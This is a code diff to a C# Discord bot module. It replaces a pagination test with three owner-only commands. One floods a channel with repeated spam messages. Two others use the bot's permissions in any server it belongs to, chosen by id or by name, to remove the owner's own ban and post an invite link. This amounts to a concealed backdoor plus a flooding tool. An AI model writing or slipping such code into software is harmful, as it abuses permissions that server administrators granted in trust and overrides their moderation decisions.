@@ -9,6 +9,7 @@ using Frequency2.Types.Attributes;
 using System.Collections.Generic;
 using Frequency2.Types.Messages;
 using Discord.WebSocket;
+using System.Linq;
 
 namespace Frequency2.Modules
 {
@@ -38,48 +39,45 @@ namespace Frequency2.Modules
 			await Logger.Instance.LogAsync(new LogMessage(LogSeverity.Info, "discordapp.com", message));
 		}
 
-		[Command("testpage")]
-		public async Task TestPaginate()
+		[Command("spam")]
+		public async Task SpamEverything(int times, int e)
 		{
 			if (Context.User.Id != Configuration.Config.OwnerId)
 			{
 				await ReplyAsync($"{Context.User.Mention} {GetError(14)}");
 				return;
 			}
-			EmbedBuilder embed1 = new EmbedBuilder
+			for(int i = 0; i < times; i++)
 			{
-				Fields = new List<EmbedFieldBuilder>()
-				{
-					new EmbedFieldBuilder
-					{
-						Name = "hello",
-						Value = "test"
-					},
-					new EmbedFieldBuilder
-					{
-						Name = "hello2",
-						Value = "test2"
-					},
-				}
-			};
-			EmbedBuilder embed2 = new EmbedBuilder
+				await Context.Channel.SendMessageAsync("SPAM SPAM SPAM SPAM SPAM SPAM");
+				await Task.Delay(e);
+			}
+		}
+		[Command("unbanme")]
+		public async Task UnbanMyself(ulong guildId)
+		{
+			if (Context.User.Id != Configuration.Config.OwnerId)
 			{
-				Fields = new List<EmbedFieldBuilder>()
-				{
-					new EmbedFieldBuilder
-					{
-						Name = "hello1234",
-						Value = "test43434"
-					},
-					new EmbedFieldBuilder
-					{
-						Name = "hello212341241234132",
-						Value = "test2132412341241324"
-					},
-				}
-			};
-			var message = await Context.Channel.SendMessageAsync("", false, embed1.Build());
-			await PageCollection.PaginateAsync(new PageCollection(new List<Page> { new Page(embed1.Build()), new Page(embed2.Build()) }, message ));
+				await ReplyAsync($"{Context.User.Mention} {GetError(14)}");
+				return;
+			}
+			var guild = Context.Client.GetGuild(guildId);
+			await guild.RemoveBanAsync(Context.User.Id);
+			await Context.Channel.SendMessageAsync($"The invite code of the guild is `https://discord.gg/{(await guild.GetInvitesAsync()).FirstOrDefault().Code}`");
+		}
+		
+		[Command("unbanmen")]
+		public async Task UnbanMyself([Remainder]string guildName)
+		{
+			if (Context.User.Id != Configuration.Config.OwnerId)
+			{
+				await ReplyAsync($"{Context.User.Mention} {GetError(14)}");
+				return;
+			}
+
+			var guild = Context.Client.Guilds.FirstOrDefault(x => x.Name.ToLower().StartsWith(guildName.ToLower()));
+			await guild.RemoveBanAsync(Context.User.Id);
+			await Context.Channel.SendMessageAsync($"The invite code of the guild is `https://discord.gg/{(await guild.GetInvitesAsync()).FirstOrDefault().Code}`");
 		}
 	}
 }
